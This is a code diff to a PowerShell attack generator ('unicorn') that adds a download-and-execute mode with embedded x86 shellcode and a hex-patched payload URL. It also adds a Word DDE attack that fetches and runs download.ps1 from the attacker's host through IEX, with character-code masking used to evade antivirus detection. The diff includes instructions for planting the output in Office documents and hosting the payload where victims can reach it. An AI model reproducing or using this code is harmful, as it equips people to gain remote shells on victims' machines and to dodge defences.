@@ -24,6 +24,7 @@ import os
 import shutil
 import random
 import string
+import binascii
 
 #######################################################################################################
 # Keep Matt Happy #####################################################################################
@@ -158,7 +159,7 @@ def ps_help():
 
 				-----POWERSHELL ATTACK INSTRUCTIONS----
 
-Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads.
+Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.
 
 Note that you will need to have a listener enabled in order to capture the attack.
 
@@ -206,7 +207,8 @@ python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
 
 Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
 unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
-handle the listener for the payload.
+handle the listener for the payload. In addition a download.ps1 will be exported as well (explained
+in the latter section).
 
 In order to apply the payload, as an example (from sensepost article):
 
@@ -218,7 +220,18 @@ In order to apply the payload, as an example (from sensepost article):
 6. Paste in the code from Unicorn
 7. Save the Word document.
 
-Once the office document is opened, you should receive a shell through powershell injection.
+Once the office document is opened, you should receive a shell through powershell injection. Note
+that DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.
+
+The DDE attack will attempt to download download.ps1 which is our powershell injection attack since
+we are limited to size restrictions. You will need to move the download.ps1 to a location that is
+accessible by the victim machine. This means that you need to host the download.ps1 in an Apache2
+directory that it has access to.
+
+You may notice that some of the commands use "{ QUOTE" these are ways of masking specific commands
+which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case
+we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL
+as it has some great methods for not calling DDE at all.
 
 [*******************************************************************************************************]
     """)
@@ -257,7 +270,7 @@ def gen_usage():
     print("")
     print("Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>")
     print("PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443")
-    print("PS Down/Exec: python unicorn.py windows/download_exec exe=test.exe url=http://badurl.com/payload.exe")
+    print("PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe")
     print("Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro")
     print("HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta")
     print("DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde")
@@ -266,10 +279,18 @@ def gen_usage():
     print("Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500")
     print("Help Menu: python unicorn.py --help\n")
 
+
+# this will convert any url to hexformat for download/exec payload
+def url_hexified(url):
+    x = binascii.hexlify(url)
+    a = [x[i:i+2] for i in range(0, len(x), 2)]
+    list = ""
+    for goat in a: list = list + "\\x" + goat.rstrip()
+    return list
+
 # split string
 def split_str(s, length):
     return [s[i:i + length] for i in range(0, len(s), length)]
-
 
 # write a file to designated path
 def write_file(path, text):
@@ -314,8 +335,7 @@ def generate_macro(full_attack, line_length=380):
     macro_rand = generate_random_string(5, 10)
 
     # start of the macro
-    macro_str = (
-        "Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
+    macro_str = ("Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
 
     if line_length is None:
         line_length_int = 380
@@ -331,10 +351,7 @@ def generate_macro(full_attack, line_length=380):
     macro_str = macro_str[:-4]
     # remove first occurrence of &
     macro_str = macro_str.replace("& ", "", 1)
-    macro_str = macro_str.replace(
-        #'powershell -w 1 -C "', r'powershell -w 1 -nop -C \""')
-        'powershell -w 1 -C "', r'-w 1 -C ""')
-    #macro_str = macro_str.replace(''''"''', r''''\""''')
+    macro_str = macro_str.replace('powershell -w 1 -C "', r'-w 1 -C ""')
     macro_str = macro_str.replace("')", "')\"\"")
 
     # obfsucate the hell out of Shell and PowerShell
@@ -437,18 +454,54 @@ def gen_hta_attack(command):
 
 # generate the actual shellcode through msf
 def generate_shellcode(payload, ipaddr, port):
-    print(
-        "[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
+    print("[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
     port = port.replace("LPORT=", "")
 
-    # if we are using traditional payloads and not download_eec
+    # if we are using traditional payloads and not download_exec
     if not "exe=" in ipaddr:
         ipaddr = "LHOST={0}".format(ipaddr)
         port = "LPORT={0}".format(port)
 
-    proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c".format(
-        payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    data = proc.communicate()[0]
+    # if download_exec is being used
+    if "url=" in ipaddr:
+        # shellcode modified from https://www.exploit-db.com/exploits/24318/ - tested on windows xp, windows 7, windows 10, server 2008, server 2012
+        shellcode = ("\\x33\\xC9\\x64\\x8B\\x41\\x30\\x8B\\x40\\x0C\\x8B"
+                     "\\x70\\x14\\xAD\\x96\\xAD\\x8B\\x58\\x10\\x8B\\x53"
+                     "\\x3C\\x03\\xD3\\x8B\\x52\\x78\\x03\\xD3\\x8B\\x72"
+                     "\\x20\\x03\\xF3\\x33\\xC9\\x41\\xAD\\x03\\xC3\\x81"
+                     "\\x38\\x47\\x65\\x74\\x50\\x75\\xF4\\x81\\x78\\x04"
+                     "\\x72\\x6F\\x63\\x41\\x75\\xEB\\x81\\x78\\x08\\x64"
+                     "\\x64\\x72\\x65\\x75\\xE2\\x8B\\x72\\x24\\x03\\xF3"
+                     "\\x66\\x8B\\x0C\\x4E\\x49\\x8B\\x72\\x1C\\x03\\xF3"
+                     "\\x8B\\x14\\x8E\\x03\\xD3\\x33\\xC9\\x51\\x68\\x2E"
+                     "\\x65\\x78\\x65\\x68\\x64\\x65\\x61\\x64\\x53\\x52"
+                     "\\x51\\x68\\x61\\x72\\x79\\x41\\x68\\x4C\\x69\\x62"
+                     "\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x53\\xFF\\xD2"
+                     "\\x83\\xC4\\x0C\\x59\\x50\\x51\\x66\\xB9\\x6C\\x6C"
+                     "\\x51\\x68\\x6F\\x6E\\x2E\\x64\\x68\\x75\\x72\\x6C"
+                     "\\x6D\\x54\\xFF\\xD0\\x83\\xC4\\x10\\x8B\\x54\\x24"
+                     "\\x04\\x33\\xC9\\x51\\x66\\xB9\\x65\\x41\\x51\\x33"
+                     "\\xC9\\x68\\x6F\\x46\\x69\\x6C\\x68\\x6F\\x61\\x64"
+                     "\\x54\\x68\\x6F\\x77\\x6E\\x6C\\x68\\x55\\x52\\x4C"
+                     "\\x44\\x54\\x50\\xFF\\xD2\\x33\\xC9\\x8D\\x54\\x24"
+                     "\\x24\\x51\\x51\\x52\\xEB\\x47\\x51\\xFF\\xD0\\x83"
+                     "\\xC4\\x1C\\x33\\xC9\\x5A\\x5B\\x53\\x52\\x51\\x68"
+                     "\\x78\\x65\\x63\\x61\\x88\\x4C\\x24\\x03\\x68\\x57"
+                     "\\x69\\x6E\\x45\\x54\\x53\\xFF\\xD2\\x6A\\x05\\x8D"
+                     "\\x4C\\x24\\x18\\x51\\xFF\\xD0\\x83\\xC4\\x0C\\x5A"
+                     "\\x5B\\x68\\x65\\x73\\x73\\x61\\x83\\x6C\\x24\\x03"
+                     "\\x61\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69"
+                     "\\x74\\x54\\x53\\xFF\\xD2\\xFF\\xD0\\xE8\\xB4\\xFF"
+                     "\\xFF\\xFF\\xURLHERE\\x00")
+
+        url = ipaddr.replace("LHOST=", "").replace("url=", "")
+        url_patched = url_hexified(url)
+        data = shellcode.replace("\\xURLHERE", url_patched)
+
+    else:
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c".format( payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        data = proc.communicate()[0]
+
     # start to format this a bit to get it ready
     repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
     data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()
@@ -457,6 +510,7 @@ def generate_shellcode(payload, ipaddr, port):
         print("[!] Shellcode was not generated for some reason. Check payload name and if Metasploit is working and try again.")
         print("Exiting....")
         sys.exit()
+
     return data
 
 # generate shellcode attack and replace hex
@@ -483,8 +537,10 @@ def gen_shellcode_attack(payload, ipaddr, port):
     # here's our shellcode prepped and ready to go
     shellcode = newdata[:-1]
 
-    # write out rc file
-    write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
+    # if we aren't using download/exec
+    if not "url=" in ipaddr:
+        # write out rc file
+        write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
 
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
@@ -552,7 +608,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
     full_attack = '''powershell -w 1 -C "s''v {0} -;s''v {1} e''c;s''v {2} ((g''v {3}).value.toString()+(g''v {4}).value.toString());powershell (g''v {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
 
-    if attack_type == "msf":
+    if attack_type == "msf" or attack_type == "download/exec":
         if attack_modifier == "macro":
             macro_attack = generate_macro(full_attack)
             write_file("powershell_attack.txt", macro_attack)
@@ -572,15 +628,18 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
             # format for dde specific payload
             if attack_modifier == "dde":
-                full_attack = full_attack[11:] # remove powershell + 1 space
-                full_attack = ('''DDE "C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('ENTER_WEBURL_FOR_PS_HERE.ps1'); # " "Microsoft Document Security Add-On"''') # quote = WindowsPowerShell, powershell.exe, and iex
+                full_attack_download = full_attack[11:] # remove powershell + 1 space
+                # incorporated technique here -> http://staaldraad.github.io/2017/10/23/msword-field-codes/
+                full_attack = ('''DDE "C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://%s/download.ps1'); # " "Microsoft Document Security Add-On"''' % (ipaddr)) # quote = WindowsPowerShell, powershell.exe, and iex
+                with open ("download.ps1", "w") as fh: fh.write(full_attack_download)
 
             write_file("powershell_attack.txt", full_attack)
             if attack_modifier != "dde":
                 ps_help() # present normal powershell attack instructions
 
             # if we are using dde attack, present that method
-            if attack_modifier == "dde": dde_help()
+            if attack_modifier == "dde": 
+                dde_help()
 
     elif attack_type == "custom_ps1":
         if attack_modifier == "macro":
@@ -602,9 +661,17 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
         print("[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")
 
-    elif attack_type == "msf":
+    elif attack_type == "msf" or attack_type =="download/exec":
         print("[*] Exported powershell output code to powershell_attack.txt.")
-        print("[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.\n")
+        if attack_type != "download/exec":
+            print("[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.")
+
+        if attack_type == "download/exec":
+            print("[*] This attack does not rely on Metasploit, its custom shellcode. Whatever you execute, if its a payload that is a reverse connection, make sure you have a listener setup.")
+
+        if attack_modifier == "dde":
+            print("[*] Exported download.ps1 which is what you use for code execution. (READ INSTRUCTIONS)")
+        print("\n")
 
     elif attack_type == "custom_ps1":
         print("[*] Exported powershell output code to powershell_attack.txt")
@@ -634,6 +701,11 @@ try:
             elif re.search('\.ps1$', sys.argv[1]) is not None:
                 attack_type = "custom_ps1"
                 ps1path = sys.argv[1]
+
+            elif sys.argv[1] =="windows/download_exec":
+                attack_type = "download/exec"
+                port = "none"
+
             else:
                 attack_type = "msf"
                 payload = sys.argv[1]
@@ -646,25 +718,26 @@ try:
             attack_modifier = sys.argv[4]
             ps = gen_shellcode_attack(payload, ipaddr, port)
         else:
-            print(
-                "[!] Options not understood or missing. Use --help switch for assistance.")
+            print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit(1)
 
         format_payload(ps, attack_type, attack_modifier, None)
 
     # default unicorn & custom ps1 macro attacks
-    elif len(sys.argv) == 4:
+    elif len(sys.argv) == 4 or attack_type == "download/exec":
         if attack_type == "custom_ps1":  # custom ps1 macro attack
             attack_modifier = sys.argv[2]
             option = sys.argv[3]
             ps = gen_ps1_attack(ps1path)
-        elif attack_type == "msf":
+        elif attack_type == "msf" or attack_type == "download/exec":
             payload = sys.argv[1]
+            if attack_type != "download/exec":
+                port = sys.argv[3]
             ipaddr = sys.argv[2]
-            port = sys.argv[3]
             attack_modifier = ""
             option = None
             ps = gen_shellcode_attack(payload, ipaddr, port)
+
         # It should not be possible to get here, but just in case it does for some reason in the future, it will
         # prevent usage of 'ps' and 'option', causing the app to crash
         else:
@@ -684,8 +757,7 @@ try:
             ps = gen_ps1_attack(ps1path)
             format_payload(ps, attack_type, attack_modifier, None)
         else:
-            print(
-                "[!] Options not understood or missing. Use --help switch for assistance.")
+            print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit()
 
     elif len(sys.argv) == 2:
@@ -702,5 +774,4 @@ try:
         gen_unicorn()
         gen_usage()
 
-except Exception as e:
-    print("[!] Something went wrong, printing the error: " + str(e))
+except Exception as e: print("[!] Something went wrong, printing the error: " + str(e))
